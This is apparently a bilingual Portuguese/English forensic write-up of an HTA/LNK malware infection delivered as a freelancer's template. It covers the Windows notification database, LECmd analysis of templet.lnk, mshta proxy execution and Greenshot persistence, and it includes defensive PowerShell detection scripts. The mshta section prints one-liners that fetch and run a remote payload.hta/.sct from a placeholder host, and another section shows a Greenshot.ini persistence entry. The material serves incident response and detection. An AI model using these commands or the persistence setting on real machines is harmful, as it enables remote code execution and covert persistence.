2. Contexto e Relevância / Context and Relevance Original

Os ficheiros HTA (HTML Application) correm com "full trust" por omissão, fora do sandbox do browser, e podem executar comandos arbitrários com os privilégios do utilizador que os lançou. Isto torna-os atrativos para atacantes que querem um único ficheiro que execute código. No caso do artigo, um freelancer entregou uma amostra de trabalho com um template; o cliente abriu o template e a máquina foi infetada por um stager HTA em segundo plano. O templet.lnk é o objeto perigoso — não o documento em si. HTA (HTML Application) files run with "full trust" by default, outside browser sandboxing, and can execute arbitrary commands with the privileges of the user who launched them. This makes them attractive to attackers who want a single file that executes code. In the article's case, a freelancer delivered a work sample with a template; the customer opened the template and the machine was infected by an HTA stager in the background. The templet.lnk is the dangerous object — not the document itself.

3. Windows Notification Database Original

Um dos primeiros locais que deu resultados foi a base de dados wpndatabase.db, em C:\Users\USERNAME\AppData\Local\Microsoft\Windows\Notifications. Esta base SQLite armazena notificações toast e web do Windows. O Chrome e outros browsers podem mostrar notificações de sites através do Action Center, e essas notificações ficam registadas nesta base. Na investigação, abrimos a base em DB Browser for SQLite e examinámos a tabela Notification. Encontrámos uma entrada que correspondia à hora em que a vítima reportou ter recebido uma mensagem com o template e uma password para o arquivo. One of the first places that paid off was the database wpndatabase.db, at C:\Users\USERNAME\AppData\Local\Microsoft\Windows\Notifications. This SQLite database stores Windows toast and web notifications. Chrome and other browsers can surface site notifications through the Action Center, and those notifications are recorded in this database. In the investigation, we opened the database in DB Browser for SQLite and examined the Notification table. We found an entry that matched the time when the victim reported receiving a message with the template and a password for the archive.

4. Análise do Ficheiro LNK Original

Uma pesquisa simples no diretório Downloads da vítima revelou dois itens: um documento benigno que correspondia à amostra prometida pelo freelancer, e um ficheiro templet.lnk. Os ficheiros LNK são um favorito de atacantes e autores de phishing. Atalhos podem chamar programas com argumentos arbitrários, e quando colocados em servidores de ficheiros partilhados ou em bundles de download podem ser usados para enganar as pessoas a lançar código. A simple search of the victim's Downloads directory turned up two items: a benign looking document that matched the freelancer's promised sample, and a templet.lnk file. LNK files are a long time favorite of attackers and phishing authors. Shortcuts can call programs with arbitrary arguments, and when placed on shared file servers or in download bundles they can be used to trick people into launching code.

4.1 LECmd — Extração do comando / Command extraction

PS > LECmd.exe -f .\templet.lnk
O LECmd extrai o binário alvo, os argumentos de linha de comando, o diretório de trabalho e outros metadados do atalho. No caso do artigo, revelou um one-liner PowerShell fortemente ofuscado. Após desofuscação, o script contacta um servidor C2, força TLS 1.2, descarrega se1.hta, escreve-o em disco, executa-o, espera 3 segundos e apaga-o. LECmd extracts the target binary, command-line arguments, working directory, and other metadata from the shortcut. In the article's case, it revealed a heavily obfuscated PowerShell one-liner. After deobfuscation, the script contacts a C2 server, enforces TLS 1.2, downloads se1.hta, writes it to disk, executes it, waits 3 seconds, and deletes it.

5. Mshta e T1218.005 Original Complementar

O mshta.exe é uma utilidade do Windows que executa ficheiros Microsoft HTML Application (HTA). Os atacantes abusam dele para execução de código malicioso, contornando soluções de controlo de aplicações que não preveem o seu uso. Como o mshta.exe executa fora do contexto de segurança do Internet Explorer, também contorna as definições de segurança do browser . A técnica está mapeada como T1218.005 — System Binary Proxy Execution: Mshta . mshta.exe is a Windows utility that executes Microsoft HTML Application (HTA) files. Adversaries abuse it for malicious code execution, bypassing application control solutions that don't account for its potential use. Since mshta.exe executes outside of Internet Explorer's security context, it also bypasses browser security settings . The technique is mapped as T1218.005 — System Binary Proxy Execution: Mshta .

5.1 Padrões de execução / Execution patterns

# HTA remoto via URL
mshta http://webserver/payload.hta

# Inline VBScript
mshta vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))

5.2 Deteção MITRE / MITRE detection

A estratégia de deteção do MITRE (DET0506) procura mshta.exe com argumentos que referenciam conteúdo HTA/script remoto ou local, seguido de criação de ficheiros, obtenção de rede, ou spawn de processos que indiquem execução de payload fora do contexto do Internet Explorer. A correlação inclui linhagem de processo pai, inspeção de linha de comando, e criação de conexão de rede para endpoints não confiáveis . MITRE's detection strategy (DET0506) looks for mshta.exe with arguments referencing remote or local HTA/script content, followed by file creation, network retrieval, or process spawning that indicates payload execution outside Internet Explorer's security context. Correlation includes parent process lineage, command-line inspection, and network connection creation to untrusted endpoints .

6. LOLAPPS Persistence (Greenshot) Original

O projeto LOLAPPS cataloga formas de adversários explorarem aplicações legítimas para persistência, movimento lateral, exfiltração e mais. Exemplos incluem o Greenshot, Visual Studio Code, entre outros, onde funcionalidades podem ser sequestradas ou reaproveitadas. No caso do artigo, entre as aplicações instaladas estava o Greenshot, uma utilidade legítima de captura de ecrã. O problema é que o Greenshot inclui um plugin External Command que permite configurar uma linha de comando arbitrária para pós-processamento. The LOLAPPS project catalogs ways adversaries can exploit legitimate applications for persistence, lateral movement, data exfiltration, and more. Examples include Greenshot, Visual Studio Code, and others where features can be hijacked or repurposed. In the article's case, among the installed applications was Greenshot, a legitimate open-source screenshot utility. The problem is that Greenshot includes an External Command plugin that allows a user to configure an arbitrary command line for post-processing.

6.1 Configuração / Configuration

# Ficheiro de configuração do Greenshot
C:\Users\USERNAME\AppData\Roaming\Greenshot\Greenshot.ini

# Entrada modificada pelo atacante (exemplo)
[ExternalCommand]
Command=\AppData\Local\Temp\templet.lnk
A cadeia de execução fica clara: quando o Greenshot inicia, executa o comando configurado, que aponta para templet.lnk no diretório Temp. Isto dá ao atacante persistência sem criar um serviço ou scheduled task — usando uma aplicação legítima que o utilizador já tem instalada. The execution chain becomes clear: when Greenshot starts, it runs the configured command, which points to templet.lnk in the Temp directory. This gives the attacker persistence without creating a service or scheduled task — using a legitimate application the user already has installed.

7.1 Script 19.1 — Deteção de Mshta com URL / Mshta with URL Detection

Objetivo: detetar mshta.exe com http://, https:// ou ftp:// na linha de comando (evento 4688). Evidência: mshta-url-detect.csv. Goal: detect mshta.exe with http://, https://, or ftp:// in the command line (event 4688). Evidence: mshta-url-detect.csv. 
# Script 19.1 - Mshta with URL Detection
$out = ".\mshta-url-detect.csv"
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $proc = ($xml.Event.EventData.Data | Where-Object Name -eq "NewProcessName").'#text'
    $cmd  = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
    if ($proc -match "mshta\.exe" -and $cmd -match "(https?|ftp)://") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Process=$proc; Command=$cmd }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Mshta URL hits: $($hits.Count) -> $out" -ForegroundColor Red

7.2 Script 19.2 — Deteção de Persistência Greenshot / Greenshot Persistence Detection

Objetivo: verificar se o Greenshot.ini tem o plugin External Command configurado com um caminho suspeito. Evidência: greenshot-persist.csv. Goal: check if Greenshot.ini has the External Command plugin configured with a suspicious path. Evidence: greenshot-persist.csv. 
# Script 19.2 - Greenshot Persistence Detection
$out = ".\greenshot-persist.csv"
$hits = @()
$iniPaths = @(
  "$env:APPDATA\Greenshot\Greenshot.ini",
  "C:\Users\*\AppData\Roaming\Greenshot\Greenshot.ini"
)
foreach ($p in $iniPaths) {
  Get-Item $p -EA SilentlyContinue | ForEach-Object {
    $content = Get-Content $_.FullName -Raw
    if ($content -match "ExternalCommand" -or $content -match "Command=.*Temp") {
      $hits += [PSCustomObject]@{ Path=$_.FullName; LastWrite=$_.LastWriteTime; Suspicious=$true }
    }
  }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Greenshot persistence: $($hits.Count) -> $out" -ForegroundColor Red

7.3 Script 19.3 — Análise de LNK com PowerShell / LNK Analysis with PowerShell

Objetivo: extrair o comando de um ficheiro .lnk sem depender do LECmd (usando COM WScript.Shell). Evidência: lnk-commands.csv. Goal: extract the command from a .lnk file without depending on LECmd (using COM WScript.Shell). Evidence: lnk-commands.csv. 
# Script 19.3 - LNK Command Extractor
param([string]$LnkPath)
$out = ".\lnk-commands.csv"
$ws = New-Object -ComObject WScript.Shell
$hits = @()
Get-ChildItem $LnkPath -Filter "*.lnk" -Recurse -EA SilentlyContinue | ForEach-Object {
  try {
    $lnk = $ws.CreateShortcut($_.FullName)
    $hits += [PSCustomObject]@{
      LnkFile = $_.FullName
      TargetPath = $lnk.TargetPath
      Arguments = $lnk.Arguments
      WorkingDirectory = $lnk.WorkingDirectory
    }
  } catch {}
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] LNK files analyzed: $($hits.Count) -> $out" -ForegroundColor Yellow
$hits | Format-Table -AutoSize

9. Mitigações Blue Team / Mitigations Complementar

  1. Monitorizar mshta.exe com URLs (evento 4688, Sysmon 1) — Script 19.1.
